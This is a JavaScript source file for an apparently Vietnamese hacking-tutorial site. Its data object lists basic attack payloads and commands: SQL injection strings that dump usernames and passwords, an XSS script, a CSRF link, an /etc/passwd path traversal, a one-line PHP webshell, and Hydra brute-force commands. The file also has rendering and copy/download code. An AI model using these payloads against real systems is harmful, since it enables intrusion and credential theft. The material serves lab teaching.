// ================== POSTS DATA ==================
const posts = {
  news: [
    {
      title: "Zero-Day mới trên Windows",
      content: "Một lỗ hổng zero-day vừa được công bố, cho phép attacker leo thang đặc quyền.",
      link: "https://thehackernews.com/"
    }
  ],

  tutorials: [
    {
      title: "SQL Injection cơ bản",
      content: "Hướng dẫn khai thác SQL Injection trong lab DVWA.",
      code: "' OR '1'='1\n' UNION SELECT null, username, password FROM users --"
    },
    {
      title: "XSS cơ bản",
      content: "Demo Stored XSS trong form comment.",
      code: "<script>alert('XSS')</script>"
    },
    {
      title: "CSRF Attack",
      content: "Ví dụ gửi request thay đổi mật khẩu qua link CSRF.",
      code: `<img src="http://victim.com/change_pass?pw=hacked">`
    },
    {
      title: "Brute Force với Hydra",
      content: "Cách brute-force form login bằng Hydra.",
      code: `hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"`
    },
    {
      title: "Directory Enumeration",
      content: "Tìm hidden folder với Gobuster.",
      code: `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`
    },
    {
      title: "LFI/RFI cơ bản",
      content: "Khai thác Local File Inclusion trong PHP.",
      code: `http://target.com/index.php?page=../../../../etc/passwd`
    },
    {
      title: "File Upload Shell",
      content: "Upload webshell qua form upload thiếu filter.",
      code: `<?php system($_GET['cmd']); ?>`
    },
    {
      title: "RCE trong PHP",
      content: "Remote Code Execution thông qua eval().",
      code: `http://target.com/index.php?cmd=phpinfo()`
    },
    {
      title: "Privilege Escalation Linux",
      content: "Tìm SUID binary để leo thang đặc quyền.",
      code: `find / -perm -4000 -type f 2>/dev/null`
    },
    {
      title: "Privilege Escalation Windows",
      content: "Check hotfix chưa cài bằng systeminfo.",
      code: `systeminfo | findstr KB`
    }
    // TODO: sẽ thêm tiếp 15 tutorials nữa
  ],

  tools: [
    {
      title: "Port Scanner",
      content: "Tool scan port đơn giản với Python.",
      code:
`import socket

target = "127.0.0.1"
for port in range(1,1000):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((target, port))
        print("Port open:", port)
    except:
        pass`,
      filename: "port_scanner.py"
    },
    {
      title: "SQLMap Demo",
      content: "Tool tự động khai thác SQLi.",
      code: `sqlmap -u "http://target.com/index.php?id=1" --dbs`,
      filename: "sqlmap_demo.sh"
    },
    {
      title: "WPScan",
      content: "Scan lỗ hổng WordPress.",
      code: `wpscan --url http://target.com --enumerate u,vp`,
      filename: "wpscan.sh"
    },
    {
      title: "Hydra Bruteforce",
      content: "Demo brute force SSH với Hydra.",
      code: `hydra -l root -P rockyou.txt ssh://192.168.1.100`,
      filename: "hydra_ssh.sh"
    },
    {
      title: "Nikto Scanner",
      content: "Quét lỗ hổng web với Nikto.",
      code: `nikto -h http://target.com`,
      filename: "nikto.sh"
    }
    // TODO: sẽ thêm tiếp 25 tools nữa
  ]
};

// ================== SANITIZE & ESCAPE ==================
function sanitizeHTML(str) {
  const temp = document.createElement("div");
  temp.textContent = str;
  return temp.innerHTML;
}

function escapeForCode(str) {
  return str.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
// ================== RENDER POSTS ==================
function renderPosts() {
  // News
  const newsContainer = document.getElementById("news");
  posts.news.forEach(post => {
    newsContainer.innerHTML += `
      <div class="card">
        <h2>📡 ${sanitizeHTML(post.title)}</h2>
        <p>${sanitizeHTML(post.content)}</p>
        <a href="${sanitizeHTML(post.link)}" target="_blank" rel="noopener noreferrer">
          <button class="btn read-btn">🔗 Read More</button>
        </a>
      </div>`;
  });

  // Tutorials
  const tutContainer = document.getElementById("tutorials");
  posts.tutorials.forEach(post => {
    const pre = document.createElement("pre");
    const code = document.createElement("code");
    code.className = "language-bash";
    code.innerHTML = escapeForCode(post.code); // ✅ hiển thị nguyên dạng
    pre.appendChild(code);

    tutContainer.appendChild(makeCard(
      sanitizeHTML(post.title),
      sanitizeHTML(post.content),
      pre,
      post.code
    ));
  });

  // Tools
  const toolContainer = document.getElementById("tools");
  posts.tools.forEach(post => {
    const pre = document.createElement("pre");
    const code = document.createElement("code");
    code.className = "language-bash";
    code.innerHTML = escapeForCode(post.code);
    pre.appendChild(code);

    toolContainer.appendChild(makeCard(
      sanitizeHTML(post.title),
      sanitizeHTML(post.content),
      pre,
      post.code,
      sanitizeHTML(post.filename)
    ));
  });

  hljs.highlightAll();
}

// ================== HELPERS ==================
function makeCard(title, content, preEl, codeStr, filename) {
  const card = document.createElement("div");
  card.className = "card";

  const h2 = document.createElement("h2");
  h2.textContent = title;
  const p = document.createElement("p");
  p.textContent = content;

  card.appendChild(h2);
  card.appendChild(p);
  card.appendChild(preEl);

  // copy button
  const copyBtn = document.createElement("button");
  copyBtn.className = "btn copy-btn";
  copyBtn.textContent = "📋 Copy";
  copyBtn.onclick = () => copyCode(codeStr);
  card.appendChild(copyBtn);

  // download button
  if (filename) {
    const dlBtn = document.createElement("button");
    dlBtn.className = "btn download-btn";
    dlBtn.textContent = "⬇ Download";
    dlBtn.onclick = () => downloadCode(codeStr, filename);
    card.appendChild(dlBtn);
  }

  return card;
}

// ================== FUNCTIONS ==================
function copyCode(code) {
  navigator.clipboard.writeText(code).then(() => {
    alert("✅ Code copied to clipboard!");
  });
}

function downloadCode(code, filename) {
  const blob = new Blob([code], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function showTab(tabId) {
  document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
  document.querySelectorAll(".content").forEach(c => c.classList.remove("active"));
  document.getElementById(tabId).classList.add("active");
  document.querySelector(`.tab[onclick="showTab('${tabId}')"]`).classList.add("active");
}

document.addEventListener("DOMContentLoaded", renderPosts);
